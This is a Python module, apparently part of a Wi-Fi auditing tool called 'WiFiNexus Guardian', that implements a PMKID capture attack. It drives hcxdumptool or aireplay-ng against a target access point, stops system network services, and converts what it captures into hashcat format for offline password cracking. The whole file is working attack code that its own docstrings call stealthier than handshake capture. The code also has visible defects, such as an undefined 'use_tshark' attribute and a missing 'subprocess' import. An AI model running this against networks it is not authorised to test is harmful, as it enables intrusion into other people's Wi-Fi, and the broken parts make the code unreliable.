"""
PMKID Attack Module for WiFiNexus Guardian
Captures PMKID hashes for WPA/WPA2 networks without requiring client handshake.
Faster and stealthier than traditional 4-way handshake capture.
"""

import logging
import os
import time
import re
from pathlib import Path
from typing import Optional, Tuple, List
from dataclasses import dataclass

from core.process_manager import RobustProcessManager

logger = logging.getLogger(__name__)

@dataclass
class PMKIDResult:
    success: bool
    pmkid_hash: Optional[str] = None
    bssid: Optional[str] = None
    essid: Optional[str] = None
    pcap_file: Optional[str] = None
    message: str = ""

class PMKIDAttacker:
    """
    PMKID Capture Attack Implementation
    
    PMKID attack captures the Pairwise Master Key Identifier from the 
    RSN (Robust Security Network) information element in the first 
    EAPOL frame sent by the Access Point.
    
    Advantages over traditional handshake capture:
    - No need to wait for clients to connect
    - No deauthentication required (stealthier)
    - Faster capture time
    - Works even if no clients are connected
    """
    
    def __init__(self, interface: str = None, output_dir: str = "captures"):
        self.interface = interface or "wlan0"
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.process_manager = RobustProcessManager(timeout=120, max_retries=2)
        
        # Additional attributes expected by tests
        self.timeout = 30
        self.is_running = False
        
        # Check for required tools
        self.use_hcxdumptool = RobustProcessManager.check_command_exists("hcxdumptool")
    
    def capture_pmkid(
        self,
        target_bssid: str,
        channel: int,
        essid: str = "",
        timeout: int = 30
    ) -> PMKIDResult:
        """
        Capture PMKID from target access point
        
        Args:
            target_bssid: Target AP MAC address
            channel: AP channel number
            essid: Network name (optional, for display)
            timeout: Maximum time to wait for PMKID
            
        Returns:
            PMKIDResult with captured hash or error message
        """
        logger.info(f"Starting PMKID capture on {target_bssid} (Channel {channel})")
        
        # Method 1: Using hcxdumptool (preferred)
        if self.use_hcxdumptool:
            return self._capture_with_hcxdumptool(target_bssid, channel, essid, timeout)
        
        # Method 2: Using tshark + aireplay-ng
        elif self.use_tshark:
            return self._capture_with_tshark(target_bssid, channel, essid, timeout)
        
        else:
            return PMKIDResult(
                success=False,
                message="No suitable tool available for PMKID capture. Install hcxdumptool or tshark."
            )
    
    def _capture_with_hcxdumptool(
        self,
        target_bssid: str,
        channel: int,
        essid: str,
        timeout: int
    ) -> PMKIDResult:
        """Capture PMKID using hcxdumptool"""
        pcapng_file = self.output_dir / f"pmkid_{target_bssid.replace(':', '_')}.pcapng"
        hash_file = self.output_dir / f"pmkid_{target_bssid.replace(':', '_')}.16800"
        
        try:
            # Stop network manager interference
            self._stop_network_managers()
            
            # Set interface down
            self.process_manager.execute(
                ["ip", "link", "set", self.interface, "down"],
                require_success=False,
                description="Set interface down"
            )
            
            # Run hcxdumptool
            cmd = [
                "hcxdumptool",
                "-i", self.interface,
                "-o", str(pcapng_file),
                "--enable_status=1",
                "--filtermode=2",
                f"--filterlist_ap={target_bssid.replace(':', '')}",
                f"--channel={channel}"
            ]
            
            logger.info(f"Running hcxdumptool on channel {channel}...")
            
            success, stdout, stderr = self.process_manager.execute(
                cmd,
                capture_output=True,
                require_success=False,
                description=f"PMKID capture with hcxdumptool"
            )
            
            # Run for specified timeout
            time.sleep(timeout)
            
            # Stop hcxdumptool
            self.process_manager.cleanup_all()
            
            # Convert to hashcat format
            if pcapng_file.exists():
                convert_cmd = [
                    "hcxpcapngtool",
                    "-o", str(hash_file),
                    str(pcapng_file)
                ]
                
                conv_success, conv_stdout, conv_stderr = self.process_manager.execute(
                    convert_cmd,
                    capture_output=True,
                    require_success=False,
                    description="Convert pcapng to hashcat format"
                )
                
                # Extract PMKID from hash file
                if hash_file.exists():
                    pmkid_hash = self._extract_pmkid_from_file(hash_file)
                    
                    if pmkid_hash:
                        logger.info(f"Successfully captured PMKID for {target_bssid}")
                        return PMKIDResult(
                            success=True,
                            pmkid_hash=pmkid_hash,
                            bssid=target_bssid,
                            essid=essid,
                            pcap_file=str(hash_file),
                            message="PMKID captured successfully"
                        )
            
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message="Failed to extract PMKID from capture"
            )
            
        except Exception as e:
            logger.error(f"PMKID capture failed: {e}")
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message=f"Error during capture: {str(e)}"
            )
        finally:
            # Restore interface
            self._restore_interface()
    
    def _capture_with_tshark(
        self,
        target_bssid: str,
        channel: int,
        essid: str,
        timeout: int
    ) -> PMKIDResult:
        """Capture PMKID using tshark and aireplay-ng"""
        pcap_file = self.output_dir / f"pmkid_{target_bssid.replace(':', '_')}.pcap"
        
        try:
            # Set monitor mode
            self._set_monitor_mode(channel)
            
            # Start tshark capture in background
            tshark_cmd = [
                "tshark",
                "-i", self.interface,
                "-w", str(pcap_file),
                "-f", f"wlan addr2 {target_bssid} or wlan addr1 {target_bssid}",
                "-Y", "eapol"
            ]
            
            logger.info("Starting packet capture with tshark...")
            
            # Note: This is a simplified version. In production, you'd run this async
            # For now, we'll use aireplay-ng to request PMKID
            
            aireplay_cmd = [
                "aireplay-ng",
                "--pmkid",
                "-b", target_bssid,
                self.interface
            ]
            
            success, stdout, stderr = self.process_manager.execute(
                aireplay_cmd,
                capture_output=True,
                require_success=False,
                timeout=timeout,
                description="Request PMKID with aireplay-ng"
            )
            
            # Parse output for PMKID
            pmkid_match = re.search(
                r'([A-F0-9]{32})[^\n]*\n.*?([A-F0-9]{12})[^\n]*\n.*?([A-F0-9]{0,32})',
                stdout,
                re.IGNORECASE
            )
            
            if pmkid_match:
                pmkid_hash = f"{pmkid_match.group(1)}*{pmkid_match.group(2)}*{pmkid_match.group(3)}*{essid}"
                logger.info(f"Successfully captured PMKID for {target_bssid}")
                
                return PMKIDResult(
                    success=True,
                    pmkid_hash=pmkid_hash,
                    bssid=target_bssid,
                    essid=essid,
                    pcap_file=str(pcap_file),
                    message="PMKID captured successfully"
                )
            
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message="PMKID not found in response"
            )
            
        except Exception as e:
            logger.error(f"PMKID capture failed: {e}")
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message=f"Error during capture: {str(e)}"
            )
        finally:
            self._restore_interface()
    
    def _extract_pmkid_from_file(self, hash_file: Path) -> Optional[str]:
        """Extract PMKID hash from hashcat format file"""
        try:
            with open(hash_file, 'r') as f:
                content = f.read().strip()
                
            # PMKID hash format: PMKID*MAC_AP*MAC_STA*ESSID
            if '*' in content:
                parts = content.split('*')
                if len(parts) >= 3 and parts[0].upper().startswith('PMKID') or len(parts[0]) == 32:
                    return content
                    
        except Exception as e:
            logger.error(f"Failed to extract PMKID: {e}")
        
        return None
    
    def _set_monitor_mode(self, channel: int):
        """Set interface to monitor mode on specific channel"""
        try:
            cmds = [
                ["ip", "link", "set", self.interface, "down"],
                ["iw", self.interface, "set", "type", "monitor"],
                ["ip", "link", "set", self.interface, "up"],
                ["iw", self.interface, "set", "channel", str(channel)]
            ]
            
            for cmd in cmds:
                self.process_manager.execute(cmd, require_success=False)
                
        except Exception as e:
            logger.error(f"Failed to set monitor mode: {e}")
    
    def _stop_network_managers(self):
        """Stop network managers that might interfere"""
        services = ["NetworkManager", "wpa_supplicant", "dhclient"]
        
        for service in services:
            try:
                subprocess.run(
                    ["systemctl", "stop", service],
                    capture_output=True,
                    timeout=5
                )
            except Exception:
                pass
    
    def _restore_interface(self):
        """Restore interface to managed mode"""
        try:
            cmds = [
                ["ip", "link", "set", self.interface, "down"],
                ["iw", self.interface, "set", "type", "managed"],
                ["ip", "link", "set", self.interface, "up"]
            ]
            
            for cmd in cmds:
                self.process_manager.execute(cmd, require_success=False)
            
            # Restart network manager
            try:
                subprocess.run(
                    ["systemctl", "start", "NetworkManager"],
                    capture_output=True,
                    timeout=5
                )
            except Exception:
                pass
                
        except Exception as e:
            logger.error(f"Failed to restore interface: {e}")
    
    @staticmethod
    def format_pmkid_for_hashcat(
        pmkid: str,
        mac_ap: str,
        mac_sta: str,
        essid: str
    ) -> str:
        """
        Format PMKID for hashcat mode 16800
        
        Format: PMKID*MAC_AP*MAC_STA*ESSID
        
        Args:
            pmkid: PMKID value (32 hex chars)
            mac_ap: AP MAC address (12 hex chars)
            mac_sta: Station MAC address (12 hex chars)
            essid: Network SSID
            
        Returns:
            Formatted hash string for hashcat
        """
        # Remove colons from MAC addresses
        mac_ap_clean = mac_ap.replace(':', '').replace('-', '').upper()
        mac_sta_clean = mac_sta.replace(':', '').replace('-', '').upper()
        
        # Ensure PMKID is uppercase
        pmkid_clean = pmkid.replace(':', '').replace('-', '').upper()
        
        return f"{pmkid_clean}*{mac_ap_clean}*{mac_sta_clean}*{essid}"
